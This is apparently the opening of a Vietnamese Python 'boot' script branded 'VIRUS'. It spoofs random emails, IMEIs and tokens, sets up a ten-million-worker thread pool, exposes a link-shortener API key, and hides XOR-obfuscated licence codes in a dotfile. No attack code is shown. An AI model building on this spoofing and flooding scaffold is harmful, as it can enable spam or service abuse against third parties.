thanhcong=0
thatbai=0
#import
import hashlib
import random
import string
import time
import urllib.parse
import json
import requests
import sys
from bs4 import BeautifulSoup
import requests
import random
import json
import string
import time
from concurrent.futures import ThreadPoolExecutor
from pystyle import*
import os
#bỏ qua chúng chỉ ssl
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
#các hàm
def generate_key(length=20):
    characters = string.digits + string.ascii_lowercase + string.ascii_uppercase
    key = ''.join(random.choice(characters) for _ in range(length))
    return key

def generate_hourly_key():
    current_time = time.strftime('%Y%m%d%H')
    hourly_key = hashlib.md5(current_time.encode()).hexdigest()
    return hourly_key[:20]

key1 = generate_hourly_key()
long_url = "https://tungle-raofficial.x10.mx/key/index.html?key=" + key1
def shorten_url(long_url):
    link = ''
    api_url = f"https://link1s.com/api?api=d526e69bae943971eba13d768807e63872fa871c&url={long_url}"
    response = requests.get(api_url).text
    for i in range(432,len(response)):
        if response[i] == '"':
            break
        link = link + response[i]
    return link
link = shorten_url(long_url)
def generate_random_string(length):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(length))
def so(length):
    return ''.join(random.choice(string.digits) for _ in range(length))
def generate_random(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
def generate_imei():
    return ''.join(random.choice(string.digits) for _ in range(15))
def Random_string(length, minh):
    return ''.join(random.choices(minh, k=length))
def get_SECUREID():
    return ''.join(random.choices('0123456789abcdef', k=17))
def getimei():
    return Random_string(8)+'-'+Random_string(4)+'-'+Random_string(4)+'-'+Random_string(4)+'-'+Random_string(12)
def get_TOKEN():
    return Random_string(22)+':'+Random_string(9)+'-'+Random_string(20)+'-'+Random_string(12)+'-'+Random_string(7)+'-'+Random_string(7)+'-'+Random_string(53)+'-'+Random_string(9)+'_'+Random_string(11)+'-'+Random_string(4)
def Random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))
def random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))
mail = generate_random(10)+'@gmail.com'
to=generate_random(53)+'-'+generate_random(86)+'-'+generate_random(121)+'_'+generate_random(2)+'-'+generate_random(94)+'-'+generate_random(3)+'_'+generate_random(9)+'-'+generate_random(15)+'_'+generate_random(17)+'-'+generate_random(39)+'_'+generate_random(85)+'_'+generate_random(34),
threading = ThreadPoolExecutor(max_workers=int(10000000))
from colorama import Fore
thatbai=0
day=0
os.system("cls" if os.name == "nt" else "clear")
status='ACTIVE'
blue = Col.light_blue
lblue = Colors.StaticMIX((Col.light_green, Col.white, Col.white))
red = Colors.StaticMIX((Col.green, Col.white, Col.white))
def format_print1(text):
    return f"""                       {lblue}{text}{Col.reset}"""

def format_input1(text):
    return f"""                       {lblue}{text}{Col.reset}"""
def format_print(symbol, text):
    return f"""                      {Col.Symbol(symbol, lblue, blue)} {lblue}{text}{Col.reset}"""

def format_input(symbol, text):
    return f"""                      {Col.Symbol(symbol, red, blue)} {red}{text}{Col.reset}"""
banner1='''
┌─────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                                                                                 │
│                              ██╗   ██╗██╗██████╗ ██╗   ██╗███████╗                              │
│                              ██║   ██║██║██╔══██╗██║   ██║██╔════╝                              │
│                              ██║   ██║██║██████╔╝██║   ██║███████╗                              │
│                              ╚██╗ ██╔╝██║██╔══██╗██║   ██║╚════██║                              │
│                               ╚████╔╝ ██║██║  ██║╚██████╔╝███████║                              │
│                                ╚═══╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                              │
│                                                                             Boot Script 2.0     │
└─────────────────────────────────────────────────────────────────────────────────────────────────┘
'''


def encrypt(plaintext, key):
    encrypted = ""
    for char in plaintext:
        encrypted += chr(ord(char) ^ key)
    return encrypted

def decrypt(encrypted, key):
    decrypted = ""
    for char in encrypted:
        decrypted += chr(ord(char) ^ key)
    return decrypted
key = 5
def file():
    current_directory = os.path.dirname(os.path.abspath(__file__))
    log_path = os.path.join(current_directory, '.logging.txt')
    hidden_file_path = os.path.join(current_directory, '.logging.txt')
    try:
        with open(log_path, 'r'):
            pass
    except FileNotFoundError:
        with open(log_path, 'w') as log_file:
                list_code='''
TUNGV4LSLM-UUQP-VQBB-LMGF
TUNGV43N6N-FPRV-ULS4-3PON
TUNGV4X1NO-NUK1-71KP-GJT1
TUNGV4VQXM-G8RD-GM2W-49JY
TUNGV4M3WM-6CGS-S0PZ-FLSW
TUNGV404HO-IH1U-0RLG-V2UT
TUNGV4R1WA-MQW9-ODKM-NQ9K
TUNGV4OY96-GIY1-Y41K-7BAX
TUNGV45PJU-BXFC-HOI0-1XMM
TUNGV4Q4QD-TEXX-MC17-8DJW
TUNGV4CZM7-SQUO-ZH1G-G4HM
TUNGV4NDY5-XPKZ-QVCV-AW7U
TUNGV490FS-M8IL-Z141-2WKK
TUNGV4JXCZ-AFEW-KXIE-C5R8
TUNGV4V8UN-YCKO-GU53-PFAM
TUNGV4ZK0D-TX1X-H3HL-HJ3G
TUNGV44GOP-T1FR-8B0G-VFZI
TUNGV45104-NWWI-2IU4-Q4KL
TUNGV4BBIY-YFRE-KSZP-DXJ8
TUNGV4Z76H-5CXY-N921-5AA8
TUNGV4819W-SALM-1UII-WDOF
TUNGV47NLU-WFKJ-IY54-F05M
TUNGV4I8AI-UQ4Y-X31C-1J6Y
TUNGV4PSQT-F630-KLOT-C3HA
TUNGV4N5MZ-NRIV-YBM8-42LB
TUNGV4MKJ0-TI1L-MZW4-F2Y0
TUNGV4HUIJ-7KYL-42SD-XZPV
TUNGV4R1HQ-EHNF-ZGA8-31GI
TUNGV4LZ9A-NOB4-RMIM-YWSB
TUNGV49B8L-UJZU-CQYE-ZXE7
TUNGV4TXP3-XLUH-SDXZ-4ZZD
TUNGV43SJE-F43B-1YPR-2W5M
TUNGV4OBVO-9D5B-7TTN-LTRG
TUNGV4J1V9-BAGV-18YD-9ZPP
TUNGV43TEC-HSDR-RHL5-ENKZ
TUNGV4RT5Q-G91A-VT02-Y9UO
TUNGV4T3PP-M62L-Z43A-UD2V
TUNGV47RUF-2FVV-DWY2-XLSD
TUNGV4891M-IHVR-LMUE-5UCE
TUNGV4DDFD-WIOA-094S-5CWP
TUNGV47BXS-BZM1-2XCM-Y71F
TUNGV43UCV-49QQ-WH15-JHTZ
TUNGV4XBZ4-1L0H-17AQ-6JBU
TUNGV4IK9V-TV1W-78RS-9IK1
TUNGV4OZGA-9HTE-P1UT-IHFZ
TUNGV4A2H5-B26J-6RDS-VF0M
TUNGV4K8XH-DW7L-MOWM-74FJ
TUNGV43MHU-NMJ7-28WY-OJDH
TUNGV4ID9M-QZSD-DSJ0-MWII
TUNGV41YN6-N5EE-7VJ3-9V9N
TUNGV4L9QW-7X82-6YUR-ZJ8L
TUNGV4P5GA-54AQ-IPRB-6C6V
TUNGV46ZHW-0CCE-NM1U-XQ4T
TUNGV4CAJ2-LNLB-CHY1-OJO4
TUNGV4GD2F-GCP6-9SVS-GW2Q
TUNGV4QI57-5VYO-DBMY-GBS2
TUNGV441B6-SIHD-T6IK-WZ7Q
TUNGV48H6J-23YM-O355-NWAL
TUNGV4H39J-E42R-U5TX-81IP
TUNGV4PQEP-8C3O-2UW9-BS9X
TUNGV43MCP-M2LP-PPGN-3DXV
TUNGV4L76B-EY5F-12D2-MGSG
TUNGV4PMCI-3MM6-VFSM-HKS9
TUNGV46G0F-0I5N-Q6E4-I1TE
TUNGV4FTOX-A0DL-BL1T-TCT6
TUNGV4979V-K4L2-07BK-UMQ7
TUNGV40W29-TNS2-6IO3-VLWB
TUNGV4MQ47-Q2LY-Y44K-BZQK
TUNGV4AOE0-QE0W-CNG2-H825
TUNGV44WQ3-ZWHA-WLIC-P136
TUNGV4RGSK-6E8H-B1M1-AX9C
TUNGV4TMC4-VWNV-O2A5-TJN7
TUNGV4UXBK-0311-3VXW-V6OD
TUNGV4RLMG-M8G3-52JB-0YZQ
TUNGV44HW3-K2XM-MDN0-05IE
TUNGV4L9OV-7NVU-6J2H-VAWE
TUNGV4AHUR-KJAT-BOU9-K14Y
TUNGV4EV37-9ZBO-3OZ7-3U8D
TUNGV4LRBI-8A6C-LK5S-9NKR
TUNGV4VZI1-2LLL-205P-HLVY
TUNGV4XG92-Y4FS-CSS7-O0D8
TUNGV41UIL-ZW9J-V5UW-QKZ1
TUNGV4FRSX-MOMS-1W3U-E3DM
TUNGV41ZQF-5441-0O2U-9DF1
TUNGV4M3HM-OY3W-LGNR-D61X
TUNGV4L6BP-XOOR-7T1D-MZT2
TUNGV4SUKG-47X6-JJXV-AIDE
TUNGV4SZ68-TCJN-NHA3-2WXI
TUNGV4GP93-FRNK-OGXK-LFG8
TUNGV4AN8Y-QRD1-IPDX-N6HG
TUNGV48F5F-ROHL-GTI4-D64Z
TUNGV4I5JE-1RWT-271Q-9OB0
TUNGV4M5RY-Y55Y-5NCR-HR5Z
TUNGV4AYLD-PDFM-HY74-WIGB
TUNGV48SAB-2RGO-FT0F-CS9J
TUNGV45QIP-HPLJ-ISQ7-R6UU
TUNGV4ZGAF-C2I8-AHQP-LYQG
TUNGV46DM8-IG21-MZDZ-6TNG
TUNGV4WLV6-AXKY-1UYJ-MMRX
TUNGV4HBL5-V7MB-M0QU-8B8F
TUNGV4OGZ7-GSHW-0M54-LG53
TUNGV452IF-TDEU-VLJC-JA0D
TUNGV4RZJO-K7UJ-2FTN-TDRT
TUNGV4X0MN-JLZX-AUHX-A5D4
TUNGV45QND-157Y-YR0P-O5QT
TUNGV49W8T-40V6-A30I-1WKU
TUNGV4NB1X-NYWH-VY7S-86FJ
TUNGV4AHA5-T4ZD-AQWB-YORZ
TUNGV4THEA-66YD-QIDJ-7Y0L
TUNGV4PGBE-ZH1G-QMBR-OJDR
TUNGV4VXCI-82J7-50F8-RFGP
TUNGV4LCCA-JQLD-2AJL-3BBW
TUNGV4NHPN-ZLWT-SV14-R8T5
TUNGV4AM8W-WEQQ-LS4D-W14S
TUNGV4E5E4-X70H-KTJQ-FQSC
TUNGV43NIT-5XOC-QIN6-BK1S
TUNGV40ZL5-J59X-HIVD-TW16
TUNGV4R55B-DP35-HJD3-U2CQ
TUNGV4OSZH-28V0-IHNJ-GFYV
TUNGV4VRVC-S7N6-LBLY-SQL1
TUNGV4800T-AJSS-D2UU-UTY6
TUNGV489PW-4XBA-0H9T-XCF1
TUNGV4C84L-Y3IQ-2MWB-807I
TUNGV4O9MB-L3R8-OPVG-GNEN
TUNGV4E2KO-H43E-PRZ2-RSQC
TUNGV4Y4NX-NOYO-OMIX-48G3
TUNGV40D66-AZFG-Z81B-8I7I
TUNGV47NES-1PA4-MAKB-OLOX
TUNGV4L5M3-9DA1-JA8O-MOVY
TUNGV48E17-8HDA-DE6A-6V1N
TUNGV4C9BK-GLRD-PSGW-OJMY
TUNGV4EBXW-U5KI-RFXM-O4BI
TUNGV4VSE8-OJNS-7PDL-FO0Q
TUNGV4S0IE-1YBQ-AOX3-SG9U
TUNGV4HNE9-DNWH-YJ0A-EMM4
TUNGV4EG1C-2O3O-28OJ-ZVT7
TUNGV4B5FW-N9C0-153P-U2G3
TUNGV4SNT1-ZY4U-DT53-8W1W
TUNGV4LAWQ-3YWX-PCAE-85CD
TUNGV451HC-GC7E-Q5ES-LMU5
TUNGV4IKQT-PQQH-IN08-JK2Y
TUNGV46E5V-RY7V-C39B-35VF
TUNGV4ON96-XCSP-L9IQ-A2LV
TUNGV43LRJ-IFIV-EP71-4H1F
TUNGV4BOQ8-4ZZS-HUD9-FJMI
TUNGV4GA9I-LVIH-KMAR-UHT4
TUNGV43J4O-FXWE-WEAU-8E0D
TUNGV4MD6H-3WHN-2G91-A6AL
TUNGV4K7CB-F9JW-ULNC-YATB
TUNGV42202-W3GT-T3ZC-8V38
TUNGV45RON-WWCP-2DKA-56U9
TUNGV4V09T-6WQW-5JOA-Q5T5
TUNGV47JP3-FQI9-KZ9W-COOP
TUNGV40R48-917E-GRLW-U8WO
TUNGV4G55N-0W2U-IN5U-RMFJ
TUNGV4YEYD-K001-GVVF-BOFC
TUNGV4WTEX-VXNQ-H1EA-JSML
TUNGV4CCDG-K74Y-0VK9-91H0
TUNGV4QHYA-8VQO-5WVJ-MKM4
TUNGV48M3M-FD7D-OQPV-1WNH
TUNGV43W51-E82C-XC81-IO9M
TUNGV4AFH7-KBW3-3JNU-1GWB
TUNGV4H9ZK-YMWC-631E-UFS3
TUNGV4IVMD-O4FZ-C3JA-1YUK
TUNGV402GP-DILC-OWV8-WNFS
TUNGV43P2P-SHHY-I1ZA-1ZBS
TUNGV4BGN7-OEOE-KQHU-M98K
TUNGV4WHYU-28WU-F3PW-02JQ
TUNGV4YW08-G0FI-G23I-VRUE
TUNGV4JJZB-VRLL-UAT2-IJ4E
TUNGV40QLZ-Q5QD-GXQI-PCOM
TUNGV4U0RU-PYRL-PLO5-BNZZ
TUNGV41607-K1W6-QZAF-ITAY
TUNGV4UJJ9-YCOG-NPAB-4SXS
TUNGV4Y0QP-40Y8-G9CX-OIVF
TUNGV4F5ZI-LIQH-KG67-4HZN
TUNGV4DMKJ-L80F-IWKX-KZL3
TUNGV43KIA-CMFF-MNJX-WB8U
TUNGV4Z98R-234I-D2VJ-9N1R
TUNGV4E6NA-NTY6-UR41-GBQ8
TUNGV4CQHU-C700-2CS7-46IV
TUNGV4XBLT-6ZM5-ZIQW-FXRD
TUNGV4C3MF-ATRA-HQDN-XOY9
TUNGV4ZSN2-U0KZ-DUWL-QHTW
TUNGV43E2M-8F3O-MCKL-0TRR
TUNGV4811A-VWEQ-V70V-USPO
TUNGV44Q00-DK2Z-GB58-E27Y
TUNGV4NDLS-7JQR-VNGZ-KDDJ
TUNGV4D18U-5XUZ-19BF-1I4N
TUNGV4V3UF-QLB9-AU39-N946
TUNGV4R5VB-VKVT-VQQB-QDH7
TUNGV4A5XG-7NEV-1QDR-MAG2
TUNGV4KOSA-NCOD-NWMG-XTHB
TUNGV4KJEF-JEZK-279V-TVT9
TUNGV4JIOO-M9BK-OT4Z-SD0J
TUNGV45Q3Y-2A36-OQMT-QXX0
TUNGV4C6TQ-LRK8-0867-3BLX
TUNGV4G02G-EBPI-T8O6-QYVI
TUNGV4TPXG-PF3K-YXZR-UHTZ
TUNGV4SM4Z-ZKI3-BVTL-K6BL
TUNGV4PLH2-7XFN-6AEO-YF05
TUNGV4XVQU-CQBV-ZQEG-P2QT
TUNGV4FXWZ-TLR3-RQDL-7295
TUNGV4AZUJ-GLIH-NFF3-4YR9
TUNGV46JF5-FB2P-QVPE-IIDM
TUNGV4ANE9-YOK6-S0NW-T6V1
TUNGV44IU7-27FY-9VAV-0TOZ
TUNGV4RM3J-XRMA-FQ6K-4URU
TUNGV4I8M6-1QXX-PIRY-1YWM
TUNGV4OU6A-4GBY-DY39-24DM
TUNGV46KMO-FQP5-8DYW-GGWY
TUNGV4Z9ZZ-NUZD-JFVV-10LR
TUNGV4YN9A-D9Q1-FYNX-L3P1
TUNGV4HCJE-ADWC-SWQV-P6RJ
TUNGV4XG2Q-YV8D-91O5-IA9U
TUNGV40J3E-K5RB-Z8FZ-7C6Z
TUNGV4EPI9-0FR6-6TTK-MYKM
TUNGV41W9A-HO8B-0EMM-OOHZ
TUNGV4ITVJ-8N78-5O2S-30VU
TUNGV456U7-NE9B-9TG9-FM4Z
TUNGV4QKEF-91I0-VMT6-IHQW
TUNGV42OIY-MLTY-ONT1-HECM
TUNGV4QCAE-Q3PR-BY0E-YT3H
TUNGV4544M-HEM3-2N2Y-O6CW
TUNGV4M7F6-7F7A-EI62-XB1U
TUNGV4HCLF-1S5S-RHH7-3UY2
TUNGV4A8SJ-MK46-0S4L-UK13
TUNGV4WV2P-KE0E-CXKI-D8TN
TUNGV4C8XU-63OO-LR3E-JIBC
TUNGV49HGB-Q5I9-OEQU-0U9Z
TUNGV4LM39-WQWJ-OD2I-SMD7
TUNGV4O3WH-32DU-9GT9-UHVC
TUNGV45J9G-4W0R-AX7N-KYCZ
TUNGV4HZL0-0ITE-HOAN-M6H4
TUNGV4J5AR-JDNJ-FMZR-YSX2
TUNGV4BFGG-BK1A-YS52-JB7E
TUNGV4ALVY-X41A-VPVZ-GV05
TUNGV4TS4N-NYQC-C78K-3G9C
TUNGV4377C-5QEZ-ONVK-UBE0
TUNGV4TMP0-LCGG-E2J1-ZMXZ
TUNGV4H6CB-PTQ9-GBRL-G4NE
TUNGV4S1HT-QTYW-6TG1-YHKS
TUNGV4OQIV-G7B9-DB8S-7F9K
TUNGV4L1ZH-VI6N-5BC9-93KN
TUNGV4RU76-QQEA-FRU7-XGGF
TUNGV4P3NP-7VBW-HM95-AE07
TUNGV4F43L-JPIN-BPHW-FCY4
TUNGV48E12-Q140-FDM3-K1VW
TUNGV45TT7-QQZJ-A3I8-URRY
TUNGV423OA-UUWM-R9BL-VGER
TUNGV47XSM-IKJ9-5YGZ-YD8R
TUNGV4ZRK4-IEEB-558U-L7EZ
TUNGV46URJ-B5BP-9QPZ-3UWG
TUNGV486D8-FXK7-OB2K-S9IB
TUNGV4ZRBV-48ZG-WUJE-3FN3
TUNGV4D487-Z9ZJ-R3IL-FLDH
TUNGV45M04-0NBD-CLAD-LQ8T
TUNGV4M2ZL-3XHM-N4FM-3Q5C
TUNGV4QRY6-48OK-AMCH-Z2K0
TUNGV4FHYM-GWQW-K3WX-MZ19
TUNGV4FF3C-F01R-CE0N-C7GW
TUNGV4OAVY-KXYI-FLWV-EXSP
TUNGV4CB0W-HDG6-EQA4-0EFX
TUNGV4LIVP-SE5Y-RODN-7RNY
TUNGV4PZSZ-FXS9-8ARY-DPSQ
TUNGV4O4YU-TW73-7NMW-086L
TUNGV44FOY-LF6X-J0YW-KRVE
TUNGV4RFYS-G7Q8-Z7Q8-ETW1
TUNGV49YOU-ZL4Y-YZP1-LP1Y
TUNGV4DJ0F-251Y-5392-KJAN
TUNGV4HIU1-TGC0-1RVY-0FEU
TUNGV4ZW1C-U0F4-UT8B-T6AW
TUNGV4F5AY-YL0H-1YOB-X6SP
TUNGV4DD3Y-U9VW-ZAI4-JTMI
TUNGV4144J-QKQB-OPIZ-0ETY
TUNGV4EKVW-5Y04-GMBJ-MQLV
TUNGV4AG7X-3MHY-LFN8-CTW2
TUNGV4B3S6-K8AW-60AH-M15X
TUNGV4HYK8-JP3U-0ZYS-IEMD
TUNGV4P5FA-NOFC-425N-UJAM
TUNGV4PE82-XSBL-DV6V-ZRPM
TUNGV4NNJ2-0UNW-BV81-SWP0
TUNGV4W2BV-E01F-NB5L-W2X1
TUNGV4KPMM-HSYG-KMMD-WGWP
TUNGV4LYUT-0LHM-G4MZ-Z337
TUNGV4Y2HH-P16S-17HR-6WU6
TUNGV40RBE-SP8S-VZ7O-G7VE
TUNGV4ZWCL-44UG-932D-F5HZ
TUNGV47H1X-X8XP-43ML-4LRI
TUNGV44GFO-G6DH-E4P2-CWYM
TUNGV4HTT0-U1RS-F60O-Q22N
TUNGV41AFD-JSW2-DZQ8-UULJ
TUNGV4YKCT-35I1-LBB6-UST6
TUNGV4UPZ9-BBA0-KRRK-NHMA
TUNGV4WDCT-ODV2-0KZZ-Q0SS
TUNGV4B99F-3SQI-NSMP-ENVY
TUNGV4ZJF4-C3LJ-4RY1-DVTU
TUNGV40RU0-K8N0-NAIX-YWBU
TUNGV4UC65-1PB9-YNV6-XJ34
TUNGV4JNOM-XGAH-OR4T-LEFR
TUNGV4OISV-DX12-W97J-Z55F
TUNGV4I7Z0-TR5E-24QA-FR73
TUNGV4Z3LX-VRGG-TSQH-TMFD
TUNGV44N4R-XSIU-T6V0-CPU0
TUNGV4I7U8-L3XS-J0XV-9267
TUNGV4X93J-0S7P-92CE-MPMB
TUNGV44LHI-R0L0-8E89-MFHP
TUNGV4PFTO-3XWT-BL4L-L46Q
TUNGV4EMXH-KYEQ-H0Z3-DQNS
TUNGV40XX7-7AQL-C63U-BV4C
TUNGV4LJUU-CQJ5-F33I-7EGS
TUNGV4IG8W-FMCD-IVIL-2W4M
TUNGV4XNYL-15WQ-13CZ-POKK
TUNGV4VP59-TH3F-7CD4-GSH4
TUNGV40R6C-0LMB-4DFL-S79H
TUNGV4Z3F0-XRRA-2Q30-J34K
TUNGV4HSVH-O3H3-K2Y6-U2ZA
TUNGV416HG-A0MH-HWJD-SR1R
TUNGV4DNZ6-M6RD-78WJ-FDJA
TUNGV4E5WL-XE5G-PLOZ-N541
TUNGV4R8DF-7I5M-K87W-5NAI
TUNGV4AAMQ-OFFY-25WC-HHZG
TUNGV4Y5GD-F060-BVJR-ZW48
TUNGV4YECW-F3HF-CXWP-XXRF
TUNGV4LSLI-TVSS-IK5C-M34Q
TUNGV4KT6E-MF7D-ZIFL-ZQSN
TUNGV49KPC-2QQX-PUP6-CMSC
TUNGV4NRX7-14AM-356T-N6GI
TUNGV4D3OZ-TH6B-ELFN-YJ49
TUNGV4BTNB-4VYA-5RYX-2T7D
TUNGV41UPZ-R7D8-4BZN-B2X6
TUNGV4IDAT-15QR-RJ3M-AINP
TUNGV4CCZ3-PODO-1GA1-CL5Q
TUNGV4MLRL-V6JC-9WJV-TAIB
TUNGV46ACY-EVAR-Z0AA-CG5P
TUNGV4WG46-6W0Q-J6TQ-L4C1
TUNGV492HU-81TB-6BRX-XTUM
TUNGV48NHY-L6SL-0W61-H5F1
TUNGV4KPVR-ZL7U-JYYS-EB78
TUNGV4JTUX-JMM4-4B18-ALVH
TUNGV45O8I-5ZCR-PCB4-9WW0
TUNGV4MT6P-E8WD-R5XO-07ZY
TUNGV4X6EX-XDH4-VMHL-NTRF
TUNGV4R2L6-F1EE-T82U-9GRM
TUNGV4UMT8-GP10-C0AP-V0F0
TUNGV4CZJO-OJQ3-WSED-ZP74
TUNGV4GANA-SLCO-G6OX-A2TY
TUNGV4R55W-AF0C-WKPQ-6ZYY
TUNGV47I1D-74A4-24QQ-VVHZ
TUNGV40AXV-VL6L-9WGQ-J6WO
TUNGV47ZVB-YA1Z-3ACH-602B
TUNGV41UDX-YC6U-JF5K-6VS6
TUNGV4A2EI-R3KG-WGVX-C07Z
TUNGV4RWTY-7QDI-ACYQ-DP4H
TUNGV4UEUL-CECP-VZ87-F9MD
TUNGV4L77G-A9P6-5UQA-K8T5
TUNGV47LVP-FQ1U-VOE0-7PQM
TUNGV4YBYV-VEGA-Q7PR-XVDQ
TUNGV4U7KW-IBQ3-XVDA-MHM9
TUNGV4QP9A-VJJD-52FP-SJPF
TUNGV4ULZ2-DYT0-HU77-KB3W
TUNGV4VFWY-L5PP-ACSM-IVVD
TUNGV46BKL-1CWV-67UL-AAPH
TUNGV49WLO-VYIS-WI7I-T20K
TUNGV432U8-O378-WLKW-6YRU
TUNGV4EL9S-5Z89-V6E6-6ECI
TUNGV4J429-9EVY-R0Y7-WY4M
TUNGV4RRIH-7JEX-DMF3-9PCD
TUNGV44K9Y-WFCQ-1SYV-HOH8
TUNGV4IQ6U-Z7S5-FLXT-WCM1
TUNGV40KR4-2KDW-QPCO-ZYDM
TUNGV491Q1-SX45-EQ3O-P9NS
TUNGV4R7MP-H51W-GMCC-H6YX
TUNGV47MVP-SDZM-JU94-MT07
TUNGV4HKP1-AUE0-YEAH-JK7B
TUNGV47O7J-E129-KZ9M-U0QK
TUNGV48S8I-CRU9-6XUS-BG6Z
TUNGV4QMOL-OFYW-EL32-C0NV
TUNGV4U8GS-RB2I-S0ST-ZKEL
TUNGV4IHJY-XSDE-UTBX-R4IS
TUNGV4ORA1-2ZDE-4L1T-3Y7C
TUNGV4DL81-BKVY-8X6E-G882
TUNGV47Z1L-8W16-P1XB-FWC6
TUNGV4VL5Y-A53Z-AT9R-QIHV
TUNGV43WYF-E02H-LRPD-STH7
TUNGV4EK8E-EP0D-HFYA-9TM8
TUNGV4JLWQ-2AXU-2LHC-2CEC
TUNGV4ACG6-7F20-NYC3-B401
TUNGV49FT6-XA5J-W1QT-LX8L
TUNGV4WAVJ-QQVE-RU38-OEBW
TUNGV4IZZ4-YHTK-ZZWX-YBJC
TUNGV44NRI-PKUF-6BH6-M4IX
TUNGV4A1AZ-AHJX-VZ0B-ZEQK
TUNGV4FIO6-XPSL-XRSM-0OIT
TUNGV4B2XD-NRDI-TY5J-61HS
TUNGV4S4X1-M5MN-QL23-GQEX
TUNGV4HCCY-6PYA-3ON4-RU9Q
TUNGV4UGRC-GE8D-4CZN-VUK1
TUNGV4UQ5Y-UYHN-QS3X-090Q
TUNGV4HKLQ-MC1L-XD6L-X5XU
TUNGV4AETN-1Y2F-263W-JGVP
TUNGV47ZT6-0ZK3-Y2LU-OE1A
TUNGV4ITA6-QXJP-QJED-AWRQ
TUNGV4JI8X-UIWF-F4WT-TFBV
TUNGV4TVL5-ONRR-G4I0-RNXQ
TUNGV4LECY-8TCU-3Z7K-PZOQ
TUNGV4K6M4-7UEW-KNUG-2DLX
TUNGV4WENG-IPC7-R1FE-WXP8
TUNGV4NQ68-2JMC-QM9E-2BSH
TUNGV4RRT1-64VX-JUAQ-IOQU
TUNGV4L72K-LJ02-O84D-3XCO
TUNGV4H30M-VXHV-V0KW-0AD6
TUNGV4XG2C-3VYT-Q41G-AK4F
TUNGV4PFF0-54PA-7MRR-JOVI
TUNGV46Z0H-LXM6-E0E8-EV1G
TUNGV4WSAZ-UMMZ-JGGH-J7K7
TUNGV4R3SV-ZZ2W-PTZT-C0IP
TUNGV4BSRI-XI6Y-SZX0-HOS7
TUNGV4VVWH-0UE2-LZXX-UU1L
TUNGV4HCPE-TE33-PKG0-0MPN
TUNGV4FMYD-DXGF-7JYX-1RJ8
TUNGV4G5AA-NOQ3-UCNT-I4MV
TUNGV4WR6U-RU59-9S2V-C962
TUNGV4LORB-C9NO-6OCX-14LB
TUNGV4K21C-WIJ0-6FI5-7XPU
TUNGV4SRZO-04H6-RKGC-PQR3
TUNGV4YQB1-X27P-BR9W-JGVY
TUNGV4LCOZ-UXVK-FF20-K5Z1
TUNGV4M53B-6AT7-YXND-OYZ6
TUNGV4IJ4U-SHI5-A1RV-SAQF
TUNGV4JB6J-M98C-DXPJ-ASYY
TUNGV4GD5O-3GOH-8LIX-2YU9
TUNGV46F8R-PH5A-IABV-3765
TUNGV4MK3Q-UCBI-BA5Q-0685
TUNGV401NL-AVJR-5XF7-J5NQ
TUNGV4ZUAK-394B-C0UW-TIXY
TUNGV4TP94-ORW3-LQT5-09YS
TUNGV4ME9K-UYI8-018A-5N6X
TUNGV49OSP-7UV2-ULQ1-UKXU
TUNGV4JW32-UDIW-4EQI-N69N
TUNGV49SMB-4HZ8-2WWT-7JGL
TUNGV4B9BI-NQ2I-WIQX-ZGNH
TUNGV4H2B1-DYEG-YFBK-J1EL
TUNGV49JFJ-RW4A-Q1PJ-YNWD
TUNGV4O12C-GFRB-MHKK-LGUF
TUNGV45J2C-IOYB-TNXM-CIDR
TUNGV4SCAA-FOAG-XGFV-E3PT
TUNGV4B9O9-IU9V-GCAH-IVSA
TUNGV4S446-4J2W-UCQW-QFZN
TUNGV4H2BL-V4LX-JJWK-B3C6
TUNGV4G64J-QCKL-MV9Z-SDN2
TUNGV412Z3-8RJM-9WDD-4SU4
TUNGV44TLC-YZYM-8IMH-UA1M
TUNGV4S6JB-D7KU-X4XT-2PZP
TUNGV4ATUJ-QBZQ-CP6S-FCLH
TUNGV4ZZOO-MR7C-LTQD-29TD
TUNGV4HTT0-9EX6-NGRJ-J505
TUNGV4CBCM-ZD8S-65NZ-S3KY
TUNGV4H0KA-O7PZ-VD1O-I734
TUNGV4RYOM-ZDF8-16XN-UVWK
TUNGV47T7I-BLR6-JFLP-RKW9
TUNGV4QS9C-ZE87-V8ZL-CC56
TUNGV4P649-HE5I-D7TM-WIB0
TUNGV4LKKL-C6VE-HKC7-QS0E
TUNGV48HVG-54GI-2NHD-3UCF
TUNGV4KDXJ-SFI8-BO5H-XBAA
TUNGV4KI31-15YZ-0QTS-QRPC
TUNGV46TVV-ETNN-IXUD-SPRX
TUNGV45K08-Q31O-UW5F-D4EK
TUNGV4WCXG-1LV2-XLP4-JZ0Z
TUNGV4AQQJ-QTI5-2D1E-C7Q8
TUNGV4GSA2-NU0M-CT70-VU40
TUNGV4UPNR-CTWR-EGIL-EXLK
TUNGV4BTV9-CB8Q-1PHZ-OWOQ
TUNGV45AGC-Q9MP-3ENM-3HAZ
TUNGV4V4JR-HW4H-BSNR-IU2Z
TUNGV4CFUS-EPVN-40LO-GM9X
TUNGV4U026-0G3L-2JWO-Y8B1
TUNGV4E4OB-1YOR-ZTJS-YZ8E
TUNGV4FAWM-X2KP-M1N3-XQFE
TUNGV4IF23-J2LG-IXR2-8WIM
TUNGV4MC7C-8RRD-MXSD-RKBX
TUNGV4D9GP-AUQ2-ST30-W8FX
TUNGV4H0UM-OX7G-LW1L-Y4L6
TUNGV4SACU-AC83-35KV-GF0T
TUNGV4KU68-8LKR-U8WF-Q7GF
TUNGV4V1NL-GB5F-55CX-K5HF
TUNGV4Z4N7-WCXP-YHFX-WSFB
TUNGV425VL-B199-56XQ-EEDM
TUNGV4B23U-N1AH-LDDA-PIBX
TUNGV4L3PM-THKU-QWCF-7NLN
TUNGV414TV-YJYH-AAGE-Y3I8
TUNGV40PPF-ZRUN-OOBV-9ZBX
TUNGV4N13Z-4HDM-HQW0-8DG5
TUNGV469OO-GY3O-MNFP-9CST
TUNGV4YJ7K-DWNM-ZUEY-APUK
TUNGV40I5B-BYQZ-DONT-9DPK
TUNGV4RJJ2-9THZ-NNFA-TXFP
TUNGV4RH9Q-QYP9-W4T7-HREN
TUNGV49YRZ-7CE4-N21R-VOYY


'''
                for code in list_code:
                    encrypted = encrypt(code, key)
                    log_file.write(encrypted)
